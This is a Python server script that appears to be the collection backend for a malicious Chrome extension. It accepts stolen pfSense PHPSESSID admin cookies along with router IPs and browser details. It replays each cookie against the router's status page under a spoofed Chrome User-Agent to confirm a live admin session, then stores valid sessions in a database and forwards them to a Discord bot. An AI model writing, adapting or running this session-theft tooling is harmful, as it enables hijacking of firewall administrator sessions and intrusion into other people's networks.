#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import urllib.parse
import sqlworker
import ssl
import discord_bot
import website_backend
import threading
import aiohttp
import asyncio

class LogHandler(BaseHTTPRequestHandler):
    def _send_cors_headers(self):
        """Sets headers required to allow Chrome Extensions to fetch data."""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def do_OPTIONS(self):
        """Handles preflight requests sent by Chrome before the actual POST."""
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()
        
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        session_id = parsed_data.get('session', [''])[0]
        browser = parsed_data.get('browser', [''])[0]
        pfsense_ip = parsed_data.get('pfsense_ip2', [''])[0]
        client_ip = self.client_address[0]
        
        if session_id:
            print(f"Session ID Received {pfsense_ip}: {session_id}")
            logged_in = asyncio.run(verify_pfsense_session(pfsense_ip, session_id))
            print(f"logged in: {logged_in}")
            if logged_in: 
                sqlworker.insert(client_ip, pfsense_ip, session_id, browser)
                print("SQL inserted")
                discord_bot.send_pfsense_id(client_ip, pfsense_ip, session_id, browser)
            self.send_response(200)
            self._send_cors_headers()
            self.end_headers()
        else:
            self.send_error(400, "Bad Request: Missing session ID")
            self._send_cors_headers()

async def verify_pfsense_session(router_ip: str, phpsessid: str) -> bool:
    """
    Evaluates if a pfSense PHPSESSID represents a signed-in administrative session.
    """
    url = f"https://{router_ip}/status_interfaces.php"
    cookies = {'PHPSESSID': phpsessid}
    
    # Masquerade as a standard Chrome browser to bypass bot filters
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    
    connector = aiohttp.TCPConnector(ssl=False)
    
    try:
        async with aiohttp.ClientSession(connector=connector, cookies=cookies, headers=headers) as session:
            async with session.get(url, allow_redirects=False, timeout=3) as response:
                
                print(f"DEBUG [{router_ip}]: Status Code {response.status}")
                print(f"DEBUG [{router_ip}]: Headers: {dict(response.headers)}")
                
                if response.status == 200:
                    return True
                elif response.status == 302:
                    location = response.headers.get('Location', '')
                    print(f"DEBUG [{router_ip}]: Redirected to {location}")
                    return False
                
                # If we get a 403, 500, or something else, print the HTML to see what pfSense is complaining about
                html_body = await response.text()
                print(f"DEBUG [{router_ip}]: HTML Output (First 200 chars): {html_body[:200]}")
                return False
                
    except asyncio.TimeoutError:
        print(f"Timeout: Could not reach pfSense at {router_ip} within 3 seconds.")
        return False
    except aiohttp.ClientError as e:
        print(f"Connection error to pfSense at {router_ip}: {e}")
        return False

def main():
    
    print("Starting Server")
    
    server_address = ('', 443)
    httpd = ThreadingHTTPServer(server_address, LogHandler)
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
    
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    threading.Thread(target=website_backend.start_server).start()
    
    httpd.serve_forever()

if __name__ == "__main__":
    main()